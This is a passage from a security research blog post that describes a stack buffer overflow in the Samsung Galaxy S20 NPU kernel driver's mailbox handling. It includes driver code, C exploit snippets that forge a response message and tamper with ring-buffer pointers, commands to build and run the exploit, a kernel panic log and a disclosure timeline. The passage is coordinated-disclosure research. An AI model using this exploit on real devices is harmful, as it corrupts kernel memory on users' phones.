    <span class="n">u32</span> <span class="n">signature2</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">signature1</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>

<p>When a message arrives or a response is sent, the read/write pointers stored in the <code>mailbox_ctrl</code> structures are updated to reflect the new positions of the cursor inside the ring buffers. </p>
<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="nc">mailbox_ctrl</span> <span class="p">{</span>
    <span class="n">u32</span> <span class="n">sgmt_ofs</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">sgmt_len</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">wptr</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">rptr</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>

<p>An illustration of this process is given below:</p>
<p><a href="https://blog.impalabs.com/rsc/2110_exploiting-samsung-npu/mailbox_ring_buffers.png"><img alt="mailbox ring buffers" src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/mailbox_ring_buffers.png"></a></p>
<p>Keep in mind that all values in the mailboxes and the header are 
shared and can be changed by either the NPU or the Android kernel. As 
you might expect, this can lead to bugs if one side trusts the other a 
bit too much, as we will see in the next section.</p>
<h2 id="vulnerability-details_1">Vulnerability Details<a class="headerlink" href="#vulnerability-details_1" title="Permanent link">¶</a></h2>
<p>For this vulnerability, we will be taking a look at the functions 
retrieving the output of a NPU request. When the NPU is done handling a 
command, it will write back the result into the response mailbox <code>f2hctrl[0]</code>. Once the result is received, the function <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/core/interface/hardware/npu-interface.c#L527"><code>nw_rslt_manager</code></a> is called.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">nw_rslt_manager</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">ret_msgid</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">npu_nw</span> <span class="o">*</span><span class="n">nw</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">message</span> <span class="n">msg</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">command</span> <span class="n">cmd</span><span class="p">;</span>

    <span class="cm">/* [...] */</span>

    <span class="n">ret</span> <span class="o">=</span> <span class="n">mbx_ipc_get_cmd</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">interface</span><span class="p">.</span><span class="n">addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">interface</span><span class="p">.</span><span class="n">mbox_hdr</span><span class="o">-&gt;</span><span class="n">f2hctrl</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">msg</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">cmd</span><span class="p">);</span>

    <span class="cm">/* [...] */</span>
<span class="p">}</span>
</code></pre></div>

<p><code>nw_rslt_manager</code> then calls <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/core/interface/hardware/mailbox_ipc.c#L403"><code>mbx_ipc_get_cmd</code></a> with the argument <code>&amp;interface.mbox_hdr-&gt;f2hctrl[0]</code>, where <code>interface.mbox_hdr</code> points to the shared mailbox header.<br>
This function reads the content of the mailbox header, before copying the result of the NPU request into <code>cmd</code> using <code>__copy_command_from_line</code>.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">mbx_ipc_get_cmd</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">underlay</span><span class="p">,</span> <span class="k">volatile</span> <span class="k">struct</span> <span class="nc">mailbox_ctrl</span> <span class="o">*</span><span class="n">ctrl</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">message</span> <span class="o">*</span><span class="n">msg</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">command</span> <span class="o">*</span><span class="n">cmd</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/* [...] */</span>

    <span class="cm">/* Reads the values stored in the mailbox header */</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">underlay</span> <span class="o">-</span> <span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">sgmt_ofs</span><span class="p">;</span>
    <span class="n">sgmt_len</span> <span class="o">=</span> <span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">sgmt_len</span><span class="p">;</span>
    <span class="n">rptr</span> <span class="o">=</span> <span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">rptr</span><span class="p">;</span>
    <span class="n">wptr</span> <span class="o">=</span> <span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">wptr</span><span class="p">;</span>

    <span class="cm">/* Checks if the readable size in the buffer is bigger than the message size */</span>
    <span class="n">readable_size</span> <span class="o">=</span> <span class="n">__get_readable_size</span><span class="p">(</span><span class="n">sgmt_len</span><span class="p">,</span> <span class="n">wptr</span><span class="p">,</span> <span class="n">rptr</span><span class="p">);</span> <span class="cm">/* ==&gt; wptr - rptr */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">readable_size</span> <span class="o">&lt;</span> <span class="n">msg</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EINVAL</span><span class="p">;</span>
        <span class="k">goto</span> <span class="n">p_err</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Copies the result from the mailbox into `cmd` */</span>
    <span class="n">updated_rptr</span> <span class="o">=</span> <span class="n">__copy_command_from_line</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">sgmt_len</span><span class="p">,</span> <span class="n">msg</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">msg</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>

    <span class="n">ctrl</span><span class="o">-&gt;</span><span class="n">rptr</span> <span class="o">=</span> <span class="n">updated_rptr</span><span class="p">;</span>

<span class="nl">p_err</span><span class="p">:</span>
    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kr">inline</span> <span class="n">u32</span> <span class="nf">__copy_command_from_line</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">base</span><span class="p">,</span> <span class="n">u32</span> <span class="n">sgmt_len</span><span class="p">,</span> <span class="n">u32</span> <span class="n">rptr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">cmd</span><span class="p">,</span> <span class="n">u32</span> <span class="n">cmd_size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/* need to reimplement accroding to user environment */</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">base</span> <span class="o">+</span> <span class="n">LINE_TO_SGMT</span><span class="p">(</span><span class="n">sgmt_len</span><span class="p">,</span> <span class="n">rptr</span><span class="p">),</span> <span class="n">cmd_size</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">rptr</span> <span class="o">+</span> <span class="n">cmd_size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>The only check performed is verifying that the readable size in the 
buffer (i.e. the difference between the read/write pointer) is bigger 
than the message size. Afterwards, it copies the result from the mailbox
 buffer into the <code>cmd</code> which is a variable defined on the stack in <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/core/interface/hardware/npu-interface.c#L531"><code>nw_rslt_manager</code></a>.</p>
<p>However, since we have code execution in the NPU, we will be able to 
modify the read/write pointer values as well as the size of the incoming
 message. We could specify, for example, a message with a length of <code>0x1000</code> bytes and set the read/write pointers in a such a way that the resulting readable size is <code>0x1100</code>. It would pass the condition on the size, but still write <code>0x1000</code> bytes in the 0x10-byte long <code>cmd</code> structure, leading to a buffer overflow once <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/core/interface/hardware/npu-interface.c#L527"><code>nw_rslt_manager</code></a> returns.</p>
<h2 id="exploitation_1">Exploitation<a class="headerlink" href="#exploitation_1" title="Permanent link">¶</a></h2>
<p>The exploit for this vulnerability is built upon the previous one, with the only addition being a different payload available <a href="https://github.com/LongtermSecurityInc/samsung-npu/tree/main/exploit/bof_payload.c">here</a>.
 With full control over the NPU, the idea is to write a payload that 
will modify the mailbox header and forge an outgoing response to the 
kernel. </p>
<p>The steps to exploit this vulnerability are as follows:</p>
<ul>
<li>First, we need to pick an arbitrary offset into the response mailbox for our crafted message. In the exploit we took <code>0x60</code>. We can then compute the corresponding address using the beginning of the mailbox region <code>MAILBOX_START</code> and the segment offset of the response mailbox <code>mailbox_hdr-&gt;f2hctrl[0].sgmt_ofs</code>.</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="cp">#define MAILBOX_START 0x80000</span>
<span class="cp">#define CRAFTED_MESSAGE_OFFSET 0x60</span>

<span class="k">struct</span> <span class="nc">message</span> <span class="o">*</span><span class="n">message</span> <span class="o">=</span> \
    <span class="n">MAILBOX_START</span> <span class="o">-</span> <span class="n">mailbox_hdr</span><span class="o">-&gt;</span><span class="n">f2hctrl</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">sgmt_ofs</span> <span class="o">+</span> <span class="n">CRAFTED_MESSAGE_OFFSET</span><span class="p">;</span>
</code></pre></div>

<ul>
<li>Then, we forge the message we want the kernel to receive and specify a size of <code>0x100</code>, which will overflow the capacity of the <code>0x10</code>-byte <code>cmd</code> kernel structure where the response will be stored.</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="cp">#define MESSAGE_SIZE 0x100</span>

<span class="n">message</span><span class="o">-&gt;</span><span class="n">magic</span> <span class="o">=</span> <span class="n">MESSAGE_MAGIC</span><span class="p">;</span>
<span class="n">message</span><span class="o">-&gt;</span><span class="n">mid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">message</span><span class="o">-&gt;</span><span class="n">command</span> <span class="o">=</span> <span class="n">COMMAND_DONE</span><span class="p">;</span>
<span class="n">message</span><span class="o">-&gt;</span><span class="n">length</span> <span class="o">=</span> <span class="n">MESSAGE_SIZE</span><span class="p">;</span> <span class="cm">/* Size that will overflow the command in the kernel */</span>
<span class="n">message</span><span class="o">-&gt;</span><span class="n">self</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
<span class="n">message</span><span class="o">-&gt;</span><span class="n">data</span> <span class="o">=</span> <span class="n">CRAFTED_MESSAGE_OFFSET</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">message</span><span class="p">);</span> <span class="cm">/* The payload is located right after the message */</span>
</code></pre></div>

<ul>
<li>Finally, we update the read and write pointers in the mailbox header, in order to get a difference larger than <code>MESSAGE_SIZE</code>.</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="cm">/* Write pointer: points to the end of the crafted message + 0x100 bytes */</span>
<span class="n">mailbox_hdr</span><span class="o">-&gt;</span><span class="n">f2hctrl</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">wptr</span> <span class="o">=</span> \
    <span class="n">CRAFTED_MESSAGE_OFFSET</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">message</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span>

<span class="cm">/* Read pointer: points to the beginning of the crafted message */</span>
<span class="n">mailbox_hdr</span><span class="o">-&gt;</span><span class="n">f2hctrl</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">rptr</span> <span class="o">=</span> <span class="n">CRAFTED_MESSAGE_OFFSET</span><span class="p">;</span>
</code></pre></div>

<p>At this point, our message is ready to be processed by the kernel. 
After our payload has been executed by the NPU, it will return 
gracefully to the command handling function and, along the way, will 
send an interrupt to the kernel notifying it that a response was 
received. The kernel will parse it, <code>memcpy</code> will copy the payload of size <code>MESSAGE_SIZE</code> into <code>cmd</code> and when <code>nw_rslt_manager</code> returns, the buffer overflow will trigger.</p>
<p>If you have an unpatched Samsung Galaxy S20 and want to test this 
exploit, you can try it by first compiling it using the Android NDK and 
the Makefile provided.</p>
<div class="codehilite"><pre><span></span><code>$ make build
/opt/android-ndk/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android29-clang <span class="se">\</span>
    -Tsymbols.ld -fPIC --target<span class="o">=</span>arm-none-eabi -march<span class="o">=</span>armv7a -nostdlib <span class="se">\</span>
    -fpie -ffreestanding -ffunction-sections  -fomit-frame-pointer -o <span class="se">\</span>
    payload.bin payload.c
/opt/android-ndk/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android-objcopy <span class="se">\</span>
    -O binary --strip-all payload.bin
/opt/android-ndk/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android29-clang <span class="se">\</span>
    -o parser_init parser_init.c
</code></pre></div>

<p>You can then push it on a device and run it.</p>
<div class="codehilite"><pre><span></span><code>$ make push
// <span class="o">[</span>...<span class="o">]</span>

$ make run
// <span class="o">[</span>...<span class="o">]</span>
adb wait-for-device shell <span class="se">\</span>
        su root sh -c <span class="s2">"/data/local/tmp/parser_init /data/local/tmp/"</span>
<span class="o">[</span>+<span class="o">]</span> Opening /dev/ion
<span class="o">[</span>+<span class="o">]</span> ION allocation
<span class="o">[</span>+<span class="o">]</span> ION buffer mapping
<span class="o">[</span>+<span class="o">]</span> Opening /dev/vertex10
<span class="o">[</span>+<span class="o">]</span> Loading the payload
</code></pre></div>

<p>The phone should reboot and the following message should be found in <code>/proc/last_kmsg</code>.</p>
<div class="codehilite"><pre><span></span><code>$ adb shell su root sh -c "cat /proc/last_kmsg" | grep -A20 "Kernel panic"
&lt;0&gt;[ 7717.705033]  [2:  npu-proto_AST:23209] Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: nw_rslt_manager+0x2e0/0x2e4
&lt;0&gt;[ 7717.705053]  [2:  npu-proto_AST:23209] [Exynos][WDT][ EMERG]: watchdog reset is started to 30secs
&lt;6&gt;[ 7717.705075]  [2:  npu-proto_AST:23209] [Exynos][WDT][  INFO]: TEMP: disable wdt keepalive
&lt;6&gt;[ 7717.705096]  [2:  npu-proto_AST:23209] [Exynos][WDT][  INFO]: Watchdog cluster 0 stop done, WTCON = 115c18
&lt;6&gt;[ 7717.705120]  [2:  npu-proto_AST:23209] [Exynos][WDT][  INFO]: s3c2410wdt_multistage_wdt_start: count=0x0000b32b, wtcon=00115c3c
&lt;6&gt;[ 7717.705135]  [2:  npu-proto_AST:23209] [Exynos][WDT][  INFO]: Watchdog cluster 0 start, WTCON = 115c39
&lt;4&gt;[ 7717.705147]  [2:  npu-proto_AST:23209] secdbg_wdd_set_start: wdd_info-&gt;init_done: true
&lt;6&gt;[ 7717.705162]  [2:  npu-proto_AST:23209] debug-snapshot: item - log_kevents is disabled
&lt;3&gt;[ 7717.705187]  [2:  npu-proto_AST:23209] mif: s5100_send_panic_noti_ext: Send CMD_KERNEL_PANIC message to CP
&lt;3&gt;[ 7717.705202]  [2:  npu-proto_AST:23209] mif: pcie_send_ap2cp_irq: Reserve doorbell interrupt: PCI not powered on
&lt;6&gt;[ 7717.705244]  [2:  npu-proto_AST:23209] mif: mif_gpio_set_value: SET GPIO AP2CP_WAKE_UP = 1 (wait 0ms, dup 0)
&lt;4&gt;[ 7717.707221]  [2:  npu-proto_AST:23209] CPU: 2 PID: 23209 Comm: npu-proto_AST FTT: 0 0 Tainted: G S      W         4.19.87 #1
&lt;4&gt;[ 7717.707235]  [2:  npu-proto_AST:23209] Hardware name: Samsung X1SLTE EUR OPEN 21 based on EXYNOS990 (DT)
&lt;4&gt;[ 7717.707246]  [2:  npu-proto_AST:23209] Call trace:
&lt;4&gt;[ 7717.707263]  [2:  npu-proto_AST:23209]  dump_backtrace+0x0/0x1b0
&lt;4&gt;[ 7717.707281]  [2:  npu-proto_AST:23209]  show_stack+0x14/0x20
&lt;4&gt;[ 7717.707296]  [2:  npu-proto_AST:23209]  dump_stack+0xd4/0x110
&lt;4&gt;[ 7717.707311]  [2:  npu-proto_AST:23209]  panic+0x174/0x2dc
&lt;4&gt;[ 7717.707328]  [2:  npu-proto_AST:23209]  __stack_chk_fail+0x18/0x1c
&lt;4&gt;[ 7717.707343]  [2:  npu-proto_AST:23209]  nw_rslt_manager+0x2e0/0x2e4
&lt;2&gt;[ 7717.707365]  [2:  npu-proto_AST:23209] SMP: stopping secondary CPUs : SYSTEM_RUNNING
</code></pre></div>

<h1 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">¶</a></h1>
<p>This short article concludes this series about Samsung's Neural 
Processing Unit implementation. This journey sarted from an opaque 
binary embedded inside Samsung's firmwares and ended with an in-depth 
understanding of this component as well as primitives that could be used
 in a privilege escalation exploit (although we're pretty far away from 
an actual LPE).</p>
<p>It's very likely that there are multiple bugs still lurking in the 
codebase of the NPU, especially in functions handling machine learning 
computations since they are pretty complex and handle a lot of user 
inputs. The lack of security mitigations also makes any exploitation 
trivial. Thankfully, the kernel does implement mitigations and has 
limited interactions with the NPU, which greatly reduces the chances of a
 successful kernel compromise from the NPU.</p>
<h1 id="timeline">Timeline<a class="headerlink" href="#timeline" title="Permanent link">¶</a></h1>
<p><strong>SVE-2021-20204</strong></p>
<ul>
<li>Jan. 30, 2021 - Initial report sent to Samsung.</li>
<li>Feb. 01, 2021 - A Security Analyst is assigned to the issue.</li>
<li>Mar. 03, 2021 - Vulnerability is confirmed.</li>
<li>May 07, 2021 - Notification that a security update patching the vulnerability has been released and the issue can now be closed.</li>
</ul>
<p><strong>SVE-2021-21074</strong></p>
<ul>
<li>Mar. 15, 2021 - Initial report sent to Samsung.</li>
<li>Mar. 16, 2021 - A Security Analyst is assigned to the issue.</li>
<li>Mar. 18, 2021 - Samsung asks for clarifications regarding the permissions needed to reach the bug.</li>
<li>Apr. 05, 2021 - Details on the permissions required sent to Samsung.</li>
<li>Apr. 14, 2021 - Vulnerability is confirmed.</li>
<li>Jul. 19, 2021 - Notification that a security update patching the 
vulnerability has been released and the issue can now be closed.</li>
</ul>
</span>
<!-- Blogpost content end ================================================= -->

</span>

            </div>

            <!-- Copyright & Links to social media -->
            <div id="copyright">
                <div id="links-social" class="columns is-centered">
                    <div class="column is-narrow is-full-mobile">
                        <a href="https://impalabs.com/">
                            <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/impalabs.svg" alt="Impalabs icon" width="30px" height="30px">&nbsp;Website
                        </a>
                        <a href="https://twitter.com/the_impalabs">
                            <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/twitter.svg" alt="Twitter icon" width="30px" height="30px">&nbsp;Twitter
                        </a>
                    </div>
                    <div class="column is-narrow is-full-mobile">
                        <a href="https://linkedin.com/company/impalabs">
                            <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/linkedin.svg" alt="Linkedin icon" width="30px" height="30px">&nbsp;LinkedIn
                        </a>
                        <a href="https://github.com/impalabs">
                            <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/github.svg" alt="Github icon" width="30px" height="30px">&nbsp;GitHub
                        </a>
                    </div>
                </div>
                <p class="copyright-text">Copyright © Impalabs 2021</p>
            </div>
        </div>
    </section>


</body></html>